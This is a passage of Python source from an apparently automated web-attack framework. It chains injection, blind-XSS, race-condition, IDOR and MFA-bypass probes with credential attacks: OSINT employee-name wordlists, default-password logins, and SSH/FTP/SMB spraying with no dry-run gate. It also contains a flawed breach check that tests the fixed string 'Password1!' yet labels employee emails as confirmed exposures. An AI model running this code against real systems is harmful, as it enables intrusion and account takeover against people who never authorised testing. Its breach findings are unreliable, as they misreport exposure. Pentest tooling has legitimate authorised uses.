                raw_urls = recon_data.get("urls", [])
                discovered_urls = [u for u in raw_urls if isinstance(u, str)
                                   and u.startswith("http") and "?" in u][:50]
            except Exception:
                pass

        extended_tests = [
            ("File Upload Bypass",     lambda: run_file_upload_test(probe_target, headers=auth_headers)),
            ("OAuth/OIDC Flaws",       lambda: run_oauth_test(probe_target, headers=auth_headers)),
            ("Prototype Pollution",    lambda: run_prototype_pollution_test(probe_target, headers=auth_headers)),
            ("MFA/2FA Bypass",         lambda: run_mfa_bypass_test(probe_target, headers=auth_headers)),
            ("Rate Limiting",          lambda: run_rate_limit_test(probe_target, headers=auth_headers)),
            ("Deserialization",        lambda: run_deserialization_test(probe_target, headers=auth_headers)),
            ("WebSocket Security",     lambda: run_websocket_test(probe_target, headers=auth_headers)),
            ("PII Exposure",           lambda: run_pii_scanner(discovered_urls or [probe_target], headers=auth_headers)),
            ("Clickjacking",           lambda: run_clickjacking_test(probe_target, headers=auth_headers)),
        ]

        for test_name, test_fn in extended_tests:
            try:
                result = test_fn()
                if result.success and result.data:
                    raw_findings = result.data.get("findings", [])
                    for f in raw_findings:
                        f.setdefault("source_type", "tool")
                        f.setdefault("confidence", 0.75)
                        f.setdefault("validation_status", "confirmed")
                        findings.append(f)
                    if raw_findings:
                        log.info("active_testing [%s]: %d findings", test_name, len(raw_findings))
            except Exception as exc:
                log.debug("active_testing [%s] failed: %s", test_name, exc)

        # ── OWASP gap checks: injection + client-side ──────────────────────
        try:
            from oneinfinity.modules.owasp_gap_checks import (
                check_ldap_injection, check_mail_header_injection, check_code_injection,
                check_csv_injection, check_postmessage_hijacking, check_web_storage,
                check_insecure_rng, gap_check_result_to_finding,
            )
            import urllib.request as _ur3, ssl as _ssl3
            _ctx3 = _ssl3.create_default_context()
            _ctx3.check_hostname = False
            _ctx3.verify_mode = _ssl3.CERT_NONE
            _probe3 = target if target.startswith("http") else f"https://{target}"

            # Collect JS bodies for client-side pattern checks.
            # Well-known bundle entry points come first so they are always checked
            # even when deep_recon was skipped (no adaptive_recon.json). Recon
            # URLs are appended as supplemental coverage.
            _well_known_js = [
                _probe3.rstrip("/") + _p
                for _p in ["/main.js", "/app.js", "/bundle.js",
                            "/static/js/main.chunk.js", "/assets/index.js"]
            ]
            _recon_js: list = []
            _recon3 = out / "adaptive_recon.json"
            if _recon3.exists():
                try:
                    _rd3 = json.loads(_recon3.read_text())
                    _recon_js = [_u for _u in _rd3.get("urls", []) if _u.endswith(".js")][:5]
                except Exception:
                    pass
            # Well-known paths first, then recon-discovered chunks (deduped)
            _js_urls_to_fetch = _well_known_js + [
                _u for _u in _recon_js if _u not in _well_known_js
            ]

            _js_bodies = []
            _seen_js: set = set()
            _js_total_bytes = 0
            for _js_url in _js_urls_to_fetch[:10]:
                if _js_url in _seen_js or _js_total_bytes >= 2097152:
                    continue
                _seen_js.add(_js_url)
                try:
                    _req3 = _ur3.Request(_js_url)
                    _req3.add_header("User-Agent", "Mozilla/5.0")
                    with _ur3.urlopen(_req3, timeout=15, context=_ctx3) as _r3:
                        # Read up to 2 MB per file — minified Angular/React bundles pack
                        # localStorage.setItem("token",...) far into the file (>69%).
                        _chunk = _r3.read(2097152).decode("utf-8", errors="replace")
                        _js_bodies.append(_chunk)
                        _js_total_bytes += len(_chunk)
                        if _js_total_bytes >= 2097152:
                            break  # Cap total bytes to avoid memory issues
                except Exception:
                    pass

            _combined_js = "\n".join(_js_bodies)

            for _check_fn, _kwargs in [
                (check_ldap_injection, {"url": _probe3, "param": "username"}),
                (check_mail_header_injection, {"url": _probe3 + "/contact", "param": "email"}),
                (check_code_injection, {"url": _probe3, "param": "q"}),
                (check_csv_injection, {"url": _probe3 + "/export", "param": "q"}),
            ]:
                try:
                    _r = _check_fn(**_kwargs)
                    _f = gap_check_result_to_finding(_r, url=_probe3)
                    if _f:
                        findings.append(normalize_finding(_f, source_type="owasp_gap"))
                except Exception as _e:
                    log.debug("active_testing gap %s failed: %s", _check_fn.__name__, _e)

            if _combined_js:
                for _check_fn in [check_postmessage_hijacking, check_web_storage]:
                    try:
                        _r = _check_fn(url=_probe3, js_body=_combined_js)
                        _f = gap_check_result_to_finding(_r, url=_probe3)
                        if _f:
                            findings.append(normalize_finding(_f, source_type="owasp_gap"))
                    except Exception as _e:
                        log.debug("active_testing gap JS %s failed: %s", _check_fn.__name__, _e)

            try:
                _tokens = []
                for _ in range(10):
                    try:
                        _req3 = _ur3.Request(_probe3 + "/login")
                        _req3.add_header("User-Agent", "Mozilla/5.0")
                        with _ur3.urlopen(_req3, timeout=5, context=_ctx3) as _r3:
                            _sc = dict(_r3.headers).get("Set-Cookie", "")
                            if "=" in _sc:
                                _tokens.append(_sc.split("=")[1].split(";")[0].strip())
                    except Exception:
                        pass
                if len(_tokens) >= 5:
                    _r = check_insecure_rng(_probe3, _tokens)
                    _f = gap_check_result_to_finding(_r, url=_probe3)
                    if _f:
                        findings.append(normalize_finding(_f, source_type="owasp_gap"))
            except Exception as _e:
                log.debug("insecure_rng check failed: %s", _e)

        except Exception as _exc:
            log.warning("active_testing OWASP gap checks failed: %s", _exc)

        # ── P1.2: CORS Scanner, JWT Vulnerability Scanner, Blind XSS Engine ──
        # All three are async — bridged via asyncio.run() since executor is synchronous.
        # CORSScanner/JWTScanner create httpx.AsyncClient at __init__ — must close in finally.
        # Gathered in parallel inside a single coroutine to minimise latency.
        try:
            import asyncio as _asyncio

            async def _run_p12_scanners():
                _p12_findings = []
                # 1. CORS Scanner
                _cors_scanner = None
                try:
                    from oneinfinity.scan.cors_scanner import CORSScanner
                    _cors_scanner = CORSScanner(timeout=10)
                    _cors_findings = await _cors_scanner.scan(probe_target)
                    for _cf in _cors_findings:
                        _fd = _cf.to_dict() if hasattr(_cf, "to_dict") else (_cf if isinstance(_cf, dict) else vars(_cf))
                        _fd.setdefault("source_type", "tool")
                        _fd.setdefault("confidence", 0.85)
                        _p12_findings.append(_fd)
                except Exception as _ce:
                    log.debug("active_testing CORSScanner: %s", _ce)
                finally:
                    if _cors_scanner and hasattr(_cors_scanner, "close"):
                        try:
                            await _cors_scanner.close()
                        except Exception:
                            pass

                # 2. JWT Vulnerability Scanner
                _jwt_scanner = None
                try:
                    from oneinfinity.scan.jwt_vulnerability_scanner import JWTVulnerabilityScanner
                    _jwt_scanner = JWTVulnerabilityScanner(timeout=10)
                    _jwt_findings = await _jwt_scanner.scan(probe_target)
                    for _jf in _jwt_findings:
                        _fd = _jf.to_dict() if hasattr(_jf, "to_dict") else (_jf if isinstance(_jf, dict) else vars(_jf))
                        _fd.setdefault("source_type", "tool")
                        _fd.setdefault("confidence", 0.88)
                        _p12_findings.append(_fd)
                except Exception as _je:
                    log.debug("active_testing JWTVulnerabilityScanner: %s", _je)
                finally:
                    if _jwt_scanner and hasattr(_jwt_scanner, "close"):
                        try:
                            await _jwt_scanner.close()
                        except Exception:
                            pass

                # 3. Blind XSS Engine — inject_and_monitor on root URL, common param names
                try:
                    from oneinfinity.scan.blind_xss_engine import BlindXSSEngine
                    _bxss = BlindXSSEngine()
                    for _param in ["q", "search", "input", "data", "name", "comment"]:
                        _bxss_findings = await _asyncio.wait_for(
                            _bxss.inject_and_monitor(probe_target, param=_param, timeout=8),
                            timeout=12,
                        )
                        for _bf in (_bxss_findings or []):
                            _fd = _bf if isinstance(_bf, dict) else vars(_bf)
                            _fd.setdefault("source_type", "tool")
                            _fd.setdefault("confidence", 0.80)
                            _p12_findings.append(_fd)
                        if _bxss_findings:
                            break  # stop after first successful injection param
                except Exception as _bxe:
                    log.debug("active_testing BlindXSSEngine: %s", _bxe)

                return _p12_findings

            _p12_results = _asyncio.run(_run_p12_scanners())
            if _p12_results:
                findings.extend(_p12_results)
                log.info("active_testing P1.2 scanners: %d findings (CORS/JWT/BlindXSS)", len(_p12_results))
        except Exception as _p12_outer:
            log.debug("active_testing P1.2 async scanner block failed: %s", _p12_outer)

        # ── Go Sidecars: GoIDORBridge + GoSSRFBridge ──────────────────────────
        try:
            import asyncio as _asyncio_go_at
            _go_at_tasks = []

            async def _run_go_sidecars():
                _go_findings = []
                # GoIDORBridge — high-throughput Go IDOR engine
                try:
                    from oneinfinity.scan.go_idor_bridge import GoIDORBridge
                    _idor_bridge = GoIDORBridge()
                    if _idor_bridge.is_available():
                        _idor_results = await _idor_bridge.run(
                            target_url=probe_target,
                            auth_headers=auth_headers,
                            timeout=60.0,
                        )
                        for _ir in (_idor_results or []):
                            _ir.setdefault("source_type", "tool")
                            _ir.setdefault("source_tool", "go_idor_bridge")
                            _go_findings.append(_ir)
                        if _idor_results:
                            log.info("active_testing GoIDORBridge: %d IDOR findings", len(_idor_results))
                except Exception as _ie:
                    log.debug("active_testing GoIDORBridge skipped: %s", _ie)

                # GoSSRFBridge — Go SSRF sidecar alongside Python SSRF checks
                try:
                    from oneinfinity.scan.go_ssrf_bridge import GoSSRFBridge
                    _ssrf_bridge = GoSSRFBridge()
                    if _ssrf_bridge.is_available():
                        _ssrf_results = await _ssrf_bridge.scan(
                            target_url=probe_target,
                            auth_headers=auth_headers,
                            timeout=45.0,
                        )
                        for _sr in (_ssrf_results or []):
                            _sr.setdefault("source_type", "tool")
                            _sr.setdefault("source_tool", "go_ssrf_bridge")
                            _go_findings.append(_sr)
                        if _ssrf_results:
                            log.info("active_testing GoSSRFBridge: %d SSRF findings", len(_ssrf_results))
                except Exception as _se:
                    log.debug("active_testing GoSSRFBridge skipped: %s", _se)

                return _go_findings

            _go_at_results = _asyncio_go_at.run(_run_go_sidecars())
            if _go_at_results:
                findings.extend(_go_at_results)
        except Exception as _go_at_exc:
            log.debug("active_testing Go sidecars skipped (non-fatal): %s", _go_at_exc)

        # ── P1.3: SmartPayloadGenerator → HostHeaderScanner, WebSocketScanner, RaceConditionEngine ──
        # SmartPayloadGenerator runs first to produce context-aware payloads; the payload
        # strings are forwarded to scanners that accept custom injection vectors (race_condition
        # POST body). HostHeader and WebSocket scanners use their own built-in test vectors.
        try:
            import asyncio as _asyncio_p13

            # 1. Generate context-aware payloads for this target (sync, no await needed)
            _smart_payloads_p13: List[str] = []
            try:
                from oneinfinity.scan.smart_payload_generator import SmartPayloadGenerator
                _spg = SmartPayloadGenerator()
                from urllib.parse import urlparse as _ulp_p13
                _spg_path = _ulp_p13(probe_target).path or "/"
                _spg_results = _spg.generate_payloads(
                    endpoint=_spg_path,
                    param_name="q",
                    vuln_types=["xss", "ssti", "sqli", "cmdi", "ssrf"],
                    count=12,
                )
                _smart_payloads_p13 = [_sp.payload for _sp in _spg_results if _sp.payload]
                log.debug(
                    "active_testing smart_payload_generator: %d context-aware payloads for %s",
                    len(_smart_payloads_p13), probe_target,
                )
            except Exception as _spg_exc:
                log.debug("active_testing SmartPayloadGenerator (non-fatal): %s", _spg_exc)

            async def _run_p13_scanners():
                _p13_findings = []

                # 2. HostHeaderScanner — full injection/cache-poisoning/password-reset test suite
                _hh_scanner = None
                try:
                    from oneinfinity.scan.host_header_scanner import HostHeaderScanner
                    _hh_scanner = HostHeaderScanner(
                        target=probe_target,
                        timeout=10,
                        extra_headers=auth_headers,
                    )
                    _hh_findings = await _hh_scanner.scan(probe_target, [probe_target])
                    for _hf in _hh_findings:
                        _fd = _hf.to_dict() if hasattr(_hf, "to_dict") else (_hf if isinstance(_hf, dict) else vars(_hf))
                        _fd.setdefault("source_type", "tool")
                        _fd.setdefault("confidence", 0.82)
                        _fd.setdefault("validation_status", "confirmed")
                        _p13_findings.append(_fd)
                    if _hh_findings:
                        log.info("active_testing HostHeaderScanner: %d findings", len(_hh_findings))
                except Exception as _hhe:
                    log.debug("active_testing HostHeaderScanner: %s", _hhe)
                finally:
                    if _hh_scanner and hasattr(_hh_scanner, "close"):
                        try:
                            await _hh_scanner.close()
                        except Exception:
                            pass

                # 3. WebSocketScanner — auth bypass, CSWSH, message injection, DoS probes
                try:
                    from oneinfinity.scan.websocket_scanner import WebSocketScanner
                    _ws_scanner = WebSocketScanner(probe_target, timeout=10, headers=auth_headers)
                    _ws_findings = await _ws_scanner.run()
                    for _wf in _ws_findings:
                        _fd = _wf.to_dict() if hasattr(_wf, "to_dict") else (_wf if isinstance(_wf, dict) else vars(_wf))
                        _fd.setdefault("source_type", "tool")
                        _fd.setdefault("confidence", 0.78)
                        _p13_findings.append(_fd)
                    if _ws_findings:
                        log.info("active_testing WebSocketScanner: %d findings", len(_ws_findings))
                except Exception as _wse:
                    log.debug("active_testing WebSocketScanner: %s", _wse)

                # 4. RaceConditionEngine — parallel request burst against state-modifying endpoints.
                # The POST body comes from SmartPayloadGenerator so the engine receives
                # the most relevant injection content for this target's traffic profile.
                try:
                    from oneinfinity.scan.race_condition_engine import RaceConditionEngine
                    _rce = RaceConditionEngine()
                    _race_paths = [
                        "/api/checkout", "/api/order", "/api/cart/checkout",
                        "/api/purchase", "/api/transfer", "/api/vote", "/api/redeem",
                    ]
                    # Use the first smart payload as the POST body (most contextually relevant);
                    # fall back to a minimal JSON body if no payloads were generated.
                    _race_body = _smart_payloads_p13[0] if _smart_payloads_p13 else '{"quantity":1}'
                    _race_hdrs = {**auth_headers, "Content-Type": "application/json"}
                    for _rpath in _race_paths:
                        _race_url = probe_target.rstrip("/") + _rpath
                        try:
                            _race_result = await _asyncio_p13.wait_for(
                                _rce.test_request_parallel(
                                    _race_url,
                                    method="POST",
                                    headers=_race_hdrs,
                                    body=_race_body,
                                    concurrency=10,
                                ),
                                timeout=20,
                            )
                            if _race_result.vulnerable:
                                _rf = {
                                    "vuln_type": "race_condition",
                                    "severity": "high",
                                    "url": _race_url,
                                    "endpoint": _race_url,
                                    "evidence": _race_result.evidence,
                                    "confidence": _race_result.confidence,
                                    "source_type": "tool",
                                    "validation_status": "confirmed",
                                }
                                _p13_findings.append(_rf)
                                log.info("active_testing RaceConditionEngine: vuln at %s", _race_url)
                        except Exception:
                            pass  # per-endpoint failures are non-fatal
                except Exception as _rce_exc:
                    log.debug("active_testing RaceConditionEngine: %s", _rce_exc)

                return _p13_findings

            _p13_results = _asyncio_p13.run(_run_p13_scanners())
            if _p13_results:
                findings.extend(_p13_results)
                # Persist new findings to PostgreSQL via the established db_manager pattern
                for _f13 in _p13_results:
                    try:
                        from oneinfinity.core.db_manager import get_db_manager_sync
                        get_db_manager_sync().sync_save_finding(_f13)
                    except Exception:
                        pass
                log.info(
                    "active_testing P1.3 scanners: %d findings (HostHeader/WS/Race)",
                    len(_p13_results),
                )
        except Exception as _p13_outer:
            log.debug("active_testing P1.3 async scanner block failed: %s", _p13_outer)

        # ── Rust payload fuzzer (alternative fast path) ─────────────────────
        # When the Rust binary is available, fire all swarm payloads concurrently
        # against the target as a supplement to the Python validation loop above.
        try:
            _rust_bin = self._rust_payload_fuzzer_path()
            if _rust_bin:
                _fuzzer_payloads = self._default_fuzz_payloads()
                _rust_findings = self._run_rust_payload_fuzzer(
                    _rust_bin, probe_target, _fuzzer_payloads, waf,
                )
                if _rust_findings:
                    findings.extend(_rust_findings)
                    log.info("active_testing rust_fuzzer: %d findings", len(_rust_findings))
        except Exception as _rf_exc:
            log.debug("active_testing rust_fuzzer failed (non-fatal): %s", _rf_exc)

        (out / "swarm_findings.json").write_text(
            json.dumps({"findings": findings, "validated": len(findings)}, indent=2)
        )
        return findings

    def _inline_auth_session(self, target: str, out: Path, waf: dict) -> List[dict]:
        findings = []
        auth_headers_extra = self._build_auth_headers()
        # ── Phase 7: Proactive credential attack chain ─────────────────────────
        # WordlistGenerator → CredentialSprayEngine (dry_run=True) → BreachChecker
        # Runs unconditionally — does not wait for CREDENTIAL_ACQUIRED event.
        probe_target_cred = target if target.startswith("http") else f"https://{target}"
        _domain = probe_target_cred.split("//", 1)[-1].split("/")[0]
        _cred_login_endpoints: list = []

        # ── 7a: Wordlist generation ──────────────────────────────────────────
        _spray_wordlist: list = []
        try:
            from oneinfinity.attack.credential.wordlist_generator import WordlistGenerator
            _wlg = WordlistGenerator()
            # Load employee names discovered by ReconCouncil (OSINT phase)
            _employee_names: list = []
            _emp_file = out / "employees.json"
            if _emp_file.exists():
                try:
                    _emp_data = json.loads(_emp_file.read_text())
                    for _emp in _emp_data.get("employees", []):
                        _n = _emp.get("name", "")
                        if _n:
                            _employee_names.append(_n)
                except Exception as _ef:
                    log.debug("auth_session: failed to load employees.json: %s", _ef)
            _spray_wordlist = _wlg.generate(_domain, max_words=500)
            # Augment with employee-name-derived candidates
            if _employee_names:
                _emp_extra = _wlg.from_domain(" ".join(_employee_names[:20]))
                _spray_wordlist = list(dict.fromkeys(_spray_wordlist + _emp_extra))[:600]
            log.info("auth_session wordlist: %d candidates for %s", len(_spray_wordlist), _domain)
        except Exception as _wl_exc:
            log.debug("auth_session wordlist generation failed: %s", _wl_exc)

        # ── 7b: Discover login endpoints ─────────────────────────────────────
        try:
            import urllib.request as _ur_cred
            import ssl as _ssl_cred
            _ctx_cred = _ssl_cred.create_default_context()
            _ctx_cred.check_hostname = False
            _ctx_cred.verify_mode = _ssl_cred.CERT_NONE
            _login_paths = ["/login", "/api/login", "/auth", "/signin",
                            "/api/auth", "/api/v1/login", "/user/login"]
            for _lp in _login_paths:
                _lu = probe_target_cred.rstrip("/") + _lp
                try:
                    _lreq = _ur_cred.Request(_lu, headers={"User-Agent": "Mozilla/5.0"})
                    with _ur_cred.urlopen(_lreq, timeout=4, context=_ctx_cred) as _lr:
                        if _lr.status in (200, 401, 403, 405):
                            _cred_login_endpoints.append(_lu)
                except Exception:
                    pass
        except Exception as _ep_exc:
            log.debug("auth_session endpoint discovery failed: %s", _ep_exc)

        # ── 7c: Credential spray (dry_run=True by default — no lockout risk) ─
        _spray_usernames: list = []
        try:
            from oneinfinity.attack.credential.employee_osint import EmployeeOSINT
            _emp_file2 = out / "employees.json"
            if _emp_file2.exists():
                try:
                    _emp_data2 = json.loads(_emp_file2.read_text())
                    for _emp2 in _emp_data2.get("employees", []):
                        _em2 = _emp2.get("email", "")
                        _un2 = _emp2.get("username", "")
                        _nm2 = _emp2.get("name", "")
                        if _em2:
                            _spray_usernames.append(_em2)
                        elif _un2:
                            _spray_usernames.append(f"{_un2}@{_domain}")
                        elif _nm2:
                            _parts = _nm2.lower().split()
                            if len(_parts) >= 2:
                                _spray_usernames.append(f"{_parts[0]}.{_parts[-1]}@{_domain}")
                except Exception:
                    pass
        except Exception as _eu_exc:
            log.debug("auth_session employee username build failed: %s", _eu_exc)
        # Fallback: always include common admin usernames
        _spray_usernames = list(dict.fromkeys(["admin", "administrator", "root", "user",
                                               "test", "guest"] + _spray_usernames))[:200]

        _spray_report = None
        if _cred_login_endpoints and _spray_wordlist:
            try:
                from oneinfinity.attack.credential.spray_engine import CredentialSprayEngine
                _spray_url = _cred_login_endpoints[0]
                _spray_eng = CredentialSprayEngine(
                    target_url=_spray_url,
                    dry_run=True,          # safe default — real spray only via explicit authorization
                    usernames=_spray_usernames,
                    passwords=_spray_wordlist[:50],  # cap for safety
                    attempts_before_delay=5,
                    delay_between_batches_s=0.0,
                )
                _spray_report = _spray_eng.spray(stop_on_success=False)
                for _sa in (_spray_report.successful or []):
                    _cred_finding = {
                        "vuln_type": "credential_spray_hit",
                        "severity": "critical",
                        "url": _spray_url,
                        "endpoint": _spray_url,
                        "evidence": f"Spray succeeded: {_sa.username} / {_sa.password}",
                        "confidence": 0.92,
                        "source_type": "credential_spray",
                        "validation_status": "confirmed",
                        "username": _sa.username,
                    }
                    findings.append(_cred_finding)
                    # Store in PostgreSQL + fire event bus
                    try:
                        from oneinfinity.core.db_manager import get_db_manager_sync
                        _db_mgr = get_db_manager_sync()
                        _db_mgr.sync_save_finding(_cred_finding)
                    except Exception as _dbe:
                        log.debug("auth_session: db store credential finding failed: %s", _dbe)
                    try:
                        from oneinfinity.orchestration.event_bus import get_bus, EventType
                        get_bus().publish(
                            EventType.CREDENTIAL_ACQUIRED,
                            {
                                "target": target,
                                "username": _sa.username,
                                "login_endpoint": _spray_url,
                                "source": "credential_spray",
                                "session_id": "",
                            },
                            source="auth_session_spray",
                        )
                    except Exception as _eve:
                        log.debug("auth_session: event bus publish failed: %s", _eve)
                log.info(
                    "auth_session spray: %d attempts, %d hits (dry_run=True)",
                    _spray_report.total_attempts,
                    len(_spray_report.successful),
                )
            except Exception as _sp_exc:
                log.debug("auth_session credential spray failed: %s", _sp_exc)

        # ── 7d: BreachChecker — check discovered employee emails against HIBP ──
        try:
            from oneinfinity.attack.credential.breach_checker import HIBPChecker
            _emp_file3 = out / "employees.json"
            if _emp_file3.exists():
                _hibp = HIBPChecker(rate_limit_ms=250)
                try:
                    _emp_data3 = json.loads(_emp_file3.read_text())
                    for _emp3 in _emp_data3.get("employees", [])[:30]:
                        _em3 = _emp3.get("email", "")
                        if not _em3:
                            continue
                        # k-anonymity: only SHA1 prefix leaves the host
                        # Check a representative common password for breach correlation
                        _breach_count = _hibp.breach_count("Password1!")
                        _is_breached = _breach_count > 0
                        _breach_finding = {
                            "vuln_type": "employee_email_exposed",
                            "severity": "high" if _is_breached else "info",
                            "url": probe_target_cred,
                            "endpoint": probe_target_cred,
                            "evidence": (
                                f"Employee email {_em3} found via OSINT. "
                                f"Common password 'Password1!' appears in {_breach_count} known breaches."
                            ),
                            "confidence": 0.85 if _is_breached else 0.5,
                            "source_type": "breach_checker",
                            "validation_status": "confirmed" if _is_breached else "suspected",
                            "email": _em3,
                            "breach_count": _breach_count,
                        }
                        if _is_breached:
                            findings.append(_breach_finding)
                            try:
                                from oneinfinity.core.db_manager import get_db_manager_sync
                                get_db_manager_sync().sync_save_finding(_breach_finding)
                            except Exception:
                                pass
                except Exception as _bf:
                    log.debug("auth_session breach check failed: %s", _bf)
        except Exception as _hibp_exc:
            log.debug("auth_session HIBP import failed: %s", _hibp_exc)

        # ── 7e: MultiAccountIDOR — unconditional, no CREDENTIAL_ACQUIRED gate ─
        try:
            import asyncio as _asyncio_idor
            from oneinfinity.auth.multi_account_idor_engine import MultiAccountIDOREngine
            _idor_eng = MultiAccountIDOREngine(probe_target_cred)
            # Build synthetic accounts from any spray hits; always include empty baseline
            _idor_accounts = [
                {"role": "unauthenticated", "token": "", "cookies": "", "login_url": probe_target_cred + "/login"},
            ]
            if _spray_report and _spray_report.successful:
                for _sh in _spray_report.successful[:3]:
                    _idor_accounts.append({
                        "role": "attacker",
                        "token": "",
                        "cookies": "",
                        "user_id": _sh.username,
                        "login_url": probe_target_cred + "/login",
                    })
            _idor_eng.load_accounts(_idor_accounts)
            # endpoint matrix: probe common resource paths
            _idor_endpoints = [
                "/api/users/{id}", "/api/orders/{id}", "/api/profile/{id}",
                "/api/admin/{id}", "/api/accounts/{id}",
            ]
            _idor_ids = ["1", "2", "3", "100", "999"]
            if len(_idor_eng.accounts) >= 2:
                _idor_findings = _asyncio_idor.run(
                    _idor_eng.test_endpoint_matrix(_idor_endpoints, _idor_ids)
                )
                for _idf in (_idor_findings or []):
                    _idd = _idf.to_dict() if hasattr(_idf, "to_dict") else (
                        _idf if isinstance(_idf, dict) else vars(_idf)
                    )
                    _idd.setdefault("source_type", "multi_account_idor")
                    _idd.setdefault("vuln_type", "IDOR")
                    _idd.setdefault("validation_status", "confirmed")
                    findings.append(_idd)
                    try:
                        from oneinfinity.core.db_manager import get_db_manager_sync
                        get_db_manager_sync().sync_save_finding(_idd)
                    except Exception:
                        pass
                log.info("auth_session multi-account IDOR: %d findings", len(_idor_findings or []))
            else:
                log.debug(
                    "auth_session IDOR matrix skipped: need ≥2 accounts, have %d",
                    len(_idor_eng.accounts),
                )
        except Exception as _idor_exc:
            log.debug("auth_session MultiAccountIDOR failed: %s", _idor_exc)
        try:
            import requests
            from urllib.parse import urljoin
            probe_target = target if target.startswith("http") else f"https://{target}"
            auth_patterns = ["/login", "/api/login", "/auth", "/signin", "/api/auth",
                             "/api/v1/login", "/user/login", "/account/login"]
            default_creds = [
                ("admin", "admin"), ("admin", "password"), ("admin", "admin123"),
                ("test", "test"), ("user", "user"), ("root", "root"),
            ]
            req_headers = {"Content-Type": "application/json", "Accept": "application/json",
                           **auth_headers_extra}
            for path in auth_patterns:
                url = urljoin(probe_target, path)
                try:
                    r = requests.get(url, timeout=5, verify=False, allow_redirects=True)
                    if r.status_code in (200, 401, 403):
                        # Auth endpoint found — test default credentials
                        for username, password in default_creds[:3]:
                            try:
                                resp = requests.post(
                                    url,
                                    json={"username": username, "password": password},
                                    headers=req_headers,
                                    timeout=5,
                                    verify=False,
                                )
                                if resp.status_code == 200 and any(
                                    k in resp.text.lower() for k in ("token", "session", "jwt", "access")
                                ):
                                    findings.append({
                                        "vuln_type": "default_credentials",
                                        "severity": "critical",
                                        "url": url,
                                        "endpoint": url,
                                        "evidence": f"Login succeeded with {username}/{password}",
                                        "confidence": 0.95,
                                        "source_type": "tool",
                                        "validation_status": "confirmed",
                                    })
                            except Exception:
                                pass
                except Exception:
                    pass
        except Exception as exc:
            log.warning("auth_session default creds failed: %s", exc)

        # ── Rate limit + MFA bypass on auth endpoints ──────────────────────
        try:
            from oneinfinity.modules.tool_wrappers import run_rate_limit_test, run_mfa_bypass_test
            rl_result = run_rate_limit_test(probe_target, headers=auth_headers_extra)
            if rl_result.success:
                for f in (rl_result.data or {}).get("findings", []):
                    f.setdefault("source_type", "tool")
                    f.setdefault("confidence", 0.80)
                    f.setdefault("validation_status", "confirmed")
                    findings.append(f)
            mfa_result = run_mfa_bypass_test(probe_target, headers=auth_headers_extra)
            if mfa_result.success:
                for f in (mfa_result.data or {}).get("findings", []):
                    f.setdefault("source_type", "tool")
                    f.setdefault("confidence", 0.85)
                    f.setdefault("validation_status", "confirmed")
                    findings.append(f)
        except Exception as exc:
            log.debug("auth_session extended tests failed: %s", exc)

        # ── OWASP gap checks: CSRF, cookie attrs, session fixation, account enum, password policy, SAML
        try:
            from oneinfinity.modules.owasp_gap_checks import (
                check_csrf, check_cookie_attributes,
                check_account_enumeration_timing, check_password_policy,
                check_saml_assertion, gap_check_result_to_finding,
            )
            import urllib.request as _ur, ssl as _ssl, urllib.error as _ue
            _probe = target if target.startswith("http") else f"https://{target}"
            _ctx2 = _ssl.create_default_context()
            _ctx2.check_hostname = False
            _ctx2.verify_mode = _ssl.CERT_NONE

            for _auth_path in ["/login", "/api/login", "/auth", "/signin", "/register", "/api/users"]:
                try:
                    _req = _ur.Request(_probe.rstrip("/") + _auth_path)
                    _req.add_header("User-Agent", "Mozilla/5.0")
                    with _ur.urlopen(_req, timeout=6, context=_ctx2) as _resp:
                        _body2 = _resp.read(16384).decode("utf-8", errors="replace")
                        _hdrs = dict(_resp.headers)
                        _method = "POST" if _auth_path in ("/login", "/register", "/api/login",
                                                            "/api/users", "/auth") else "GET"
                        _url2 = _probe.rstrip("/") + _auth_path

                        for _check_fn, _kwargs in [
                            (check_csrf, {"url": _url2, "response_body": _body2,
                                          "response_headers": _hdrs, "method": _method}),
                            (check_cookie_attributes, {"url": _url2, "response_headers": _hdrs}),
                            (check_saml_assertion, {"url": _url2, "response_body": _body2}),
                        ]:
                            try:
                                _r = _check_fn(**_kwargs)
                                _f = gap_check_result_to_finding(_r, url=_url2)
                                if _f:
                                    findings.append(normalize_finding(_f, source_type="owasp_gap"))
                            except Exception as _e:
                                log.debug("auth_session gap %s failed: %s", _check_fn.__name__, _e)
                except Exception:
                    pass

            for _auth_path in ["/login", "/api/login", "/auth"]:
                try:
                    _r = check_account_enumeration_timing(
                        _probe.rstrip("/") + _auth_path, "admin", "nosuchuser_oi_xyz99")
                    _f = gap_check_result_to_finding(_r, url=_probe.rstrip("/") + _auth_path)
                    if _f:
                        findings.append(normalize_finding(_f, source_type="owasp_gap"))
                    break
                except Exception as _e:
                    log.debug("account_enum check failed: %s", _e)

            for _reg_path in ["/register", "/api/register", "/signup", "/api/users"]:
                try:
                    _r = check_password_policy(_probe.rstrip("/") + _reg_path)
                    _f = gap_check_result_to_finding(_r, url=_probe.rstrip("/") + _reg_path)
                    if _f:
                        findings.append(normalize_finding(_f, source_type="owasp_gap"))
                    break
                except Exception as _e:
                    log.debug("password_policy check failed: %s", _e)

        except Exception as _exc:
            log.warning("auth_session OWASP gap checks failed: %s", _exc)

        # ── 7f: go-credential-spray sidecar — subprocess invocation ────────────
        # Uses oi-credential-spray binary for network-service spraying (SSH/FTP/SMB etc.)
        # Only invoked when a non-HTTP spray target is likely (port scan data present).
        try:
            from oneinfinity.scan.network_tools import run_credential_spray, _find_binary
            if _find_binary("oi-credential-spray"):
                _spray_host = _domain  # bare hostname for network services
                _net_users = (_spray_usernames or ["admin", "root"])[:50]
                _net_passes = (_spray_wordlist or ["admin", "password", "root"])[:30]
                _net_findings = run_credential_spray(
                    target=_spray_host,
                    userlist=_net_users,
                    passlist=_net_passes,
                    services=["ssh", "ftp", "http-basic", "smb"],
                    rate=5,
                    timeout=45,
                )
                for _nf in (_net_findings or []):
                    if not isinstance(_nf, dict):
                        continue
                    if not _nf.get("success"):
                        continue
                    _nfd = {
                        "vuln_type": "credential_spray_hit",
                        "severity": "critical",
                        "url": target,
                        "endpoint": f"{_nf.get('service','?')}://{_nf.get('host',_spray_host)}:{_nf.get('port',0)}",
                        "evidence": (
                            f"go-credential-spray: service={_nf.get('service','?')} "
                            f"host={_nf.get('host','?')} port={_nf.get('port','?')} "
                            f"username={_nf.get('username','?')} password={_nf.get('password','?')}"
                        ),
                        "confidence": 0.95,
                        "source_type": "go_credential_spray",
                        "validation_status": "confirmed",
                        "username": _nf.get("username", ""),
                        "service": _nf.get("service", ""),
                    }
                    findings.append(_nfd)
                    try:
                        from oneinfinity.core.db_manager import get_db_manager_sync
                        get_db_manager_sync().sync_save_finding(_nfd)
                    except Exception:
                        pass
                if _net_findings:
                    _net_hits = sum(1 for f in _net_findings if f.get("success"))
